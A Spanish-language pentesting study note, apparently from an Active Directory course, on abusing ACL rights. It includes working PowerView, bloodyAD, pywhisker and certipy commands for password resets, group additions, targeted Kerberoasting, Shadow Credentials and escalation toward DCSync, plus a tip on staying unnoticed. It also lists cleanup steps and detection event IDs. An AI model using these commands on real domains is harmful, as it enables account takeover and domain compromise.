---
tags:
  - Active-Directory
  - Windows
  - Linux
  - Pentesting/Post-Explotacion
Fecha de actualización: 2026-07-21
Nota previa: "[[13 - Enumeración de ACLs]]"
Nota siguiente: "[[15 - DCSync]]"
Area: "[[AD Abuso de ACLs.base|Abuso de ACLs]]"
---
---

Cada derecho abusable ([[12 - Primer de abuso de ACLs]]) tiene su técnica. Aquí las principales, desde Windows (`PowerView`) y desde Linux (`bloodyAD`, impacket) — el host de ataque manda.

# ForceChangePassword — resetear la contraseña

Cambias la contraseña de la víctima sin conocer la actual:

```powershell
$p = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity mmorgan -AccountPassword $p    # PowerView
```

```shell-session
$ bloodyAD --host 172.16.5.5 -d inlanefreight.local -u me -p pass set password mmorgan 'NewPass123!'
```

<mark style="background: #FFB86CA6;">Reset directo = te apropias de la cuenta</mark>, pero es ruidoso (la víctima notará que no puede entrar).

# GenericWrite / AddMember — añadirte a un grupo

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members damundsen    # PowerView
```

```shell-session
$ bloodyAD --host 172.16.5.5 -d inlanefreight.local -u me -p pass add groupMember 'Help Desk Level 1' damundsen
```

# GenericWrite sobre un usuario — Kerberoasting dirigido

Escribes un SPN falso en la cuenta, la kerberoasteas y borras el SPN: <mark style="background: #8000E1A6;">convierte el permiso de escritura en su contraseña</mark>. Detalle en [[11 - Kerberoasting]]. También sirve para forzar AS-REP roasting quitándole la pre-autenticación.

# Shadow Credentials — la vía moderna

<mark style="background: #ADCCFFA6;">Con `GenericWrite`/`GenericAll` sobre un usuario o equipo, añades una credencial de clave (`msDS-KeyCredentialLink`) y te autenticas por `PKINIT` para obtener su hash NT</mark>. La técnica preferida en 2026 porque <mark style="background: #FF5582A6;">no cambia nada visible para la víctima</mark> (a diferencia de un reset):

```shell-session
$ pywhisker -d inlanefreight.local -u me -p pass --target mmorgan --action add
$ certipy auth -pfx mmorgan.pfx -dc-ip 172.16.5.5
```

En Windows, `Whisker` hace lo mismo. Requiere que el dominio tenga PKI (ADCS), casi siempre presente.

# WriteDACL / WriteOwner — escalar el propio derecho

Con `WriteOwner` te haces dueño del objeto; con `WriteDACL` <mark style="background: #FFB86CA6;">te concedes `GenericAll` — o directamente los derechos de replicación para un [[15 - DCSync]]</mark>.

> [!warning]+ Limpieza obligatoria
> Todo cambio de ACL/objeto se **revierte**: borra el SPN falso, sácate del grupo, elimina el `KeyCredentialLink`. No hacerlo rompe producción y deja evidencia. Anota cada cambio antes de ejecutarlo.

> [!warning]+ Detección
> Modificar objetos genera `5136` (objeto modificado), `4738` (cuenta cambiada) y `4728` (miembro añadido a grupo). Un `5136` sobre `msDS-KeyCredentialLink` es firma de *shadow credentials*, y MDI lo marca. Telemetría en [[25 - Detección y evasión en AD]].
